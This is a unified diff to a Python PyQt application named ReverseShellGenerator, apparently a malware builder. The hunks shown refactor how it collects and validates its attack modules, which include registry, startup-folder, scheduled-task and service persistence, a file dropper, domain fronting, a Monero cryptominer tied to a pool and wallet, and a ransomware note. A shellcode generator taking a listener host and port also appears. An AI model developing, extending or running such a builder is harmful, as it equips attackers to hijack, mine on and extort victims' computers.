@@ -1,5 +1,4 @@
-[file name]: thorn-apple.py
-[file content begin]
+#!/usr/bin/env python3
 import sys
 import random
 import binascii
@@ -54,7 +53,7 @@ SERVER_CERT = b"""-----BEGIN CERTIFICATE-----
 MIIDazCCAlOgAwIBAgIURZx8l0Jk5Z0uYtYV5j3VzJ0m0jgwDQYJKoZIhvcNAQEL
 BQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoM
 GEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAeFw0yNDA0MjIxMjI1NDJaFw0yNTA0
-MjIxMjI1NDJaMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEw
+MjIxMjI5NDJaMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEw
 HwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwggEiMA0GCSqGSIb3DQEB
 AQUAA4IBDwAwggEKAoIBAQDZgD7bO3Wg9qS4Y1cR7e9wUj7d8e9xN1jM7gK5fJm
 l9sQfC6dZ5kZ5mZ5nZ5oZ5pZ5qZ5rZ5sZ5tZ5uZ5vZ5wZ5xZ5yZ5zZ5A5BA5CA
@@ -856,14 +855,15 @@ class ReverseShellGenerator(QMainWindow):
             errors.append("Selected file for dropper does not exist")
             
         # Validate mining config
-        if "MINER" in self.get_selected_modules():
+        modules = self.get_selected_modules()
+        if "MINER" in modules:
             if not self.pool_input.text():
                 errors.append("Mining pool URL is required")
             if not self.wallet_input.text() or len(self.wallet_input.text()) < 90:
                 errors.append("Invalid Monero wallet address")
                 
         # Validate domain fronting
-        if self.fronting_cb.isChecked():
+        if "DOMAIN_FRONTING" in modules:
             if not self.front_domain_input.text() or not self.real_domain_input.text():
                 errors.append("Both domains are required for domain fronting")
                 
@@ -954,14 +954,18 @@ class ReverseShellGenerator(QMainWindow):
 
     def get_selected_modules(self):
         modules = []
-        if self.registry_cb.isChecked(): modules.append("REGISTRY_PERSIST")
-        if self.startup_cb.isChecked(): modules.append("STARTUP_FOLDER")
-        if self.scheduled_task_cb.isChecked(): modules.append("SCHEDULED_TASK")
-        if self.service_cb.isChecked(): modules.append("SYSTEM_SERVICE")
-        if self.file_path_input.text(): modules.append("FILE_DROPPER")
-        if self.fronting_cb.isChecked(): modules.append("DOMAIN_FRONTING")
-        if self.pool_input.text() and self.wallet_input.text(): modules.append("MINER")
-        if self.note_input.toPlainText(): modules.append("RANSOMWARE")
+        try:
+            if self.registry_cb.isChecked(): modules.append("REGISTRY_PERSIST")
+            if self.startup_cb.isChecked(): modules.append("STARTUP_FOLDER")
+            if self.scheduled_task_cb.isChecked(): modules.append("SCHEDULED_TASK")
+            if self.service_cb.isChecked(): modules.append("SYSTEM_SERVICE")
+            if self.file_path_input.text(): modules.append("FILE_DROPPER")
+            if self.fronting_cb.isChecked(): modules.append("DOMAIN_FRONTING")
+            if self.pool_input.text() and self.wallet_input.text(): modules.append("MINER")
+            if self.note_input.toPlainText(): modules.append("RANSOMWARE")
+        except RuntimeError:
+            # Handle case where C++ object was deleted
+            pass
         return modules
 
     def generate_shellcode(self, lhost, lport, arch, platform_os):
@@ -1550,4 +1554,3 @@ if __name__ == "__main__":
     window = ReverseShellGenerator()
     window.show()
     sys.exit(app.exec_())
-[file content end]
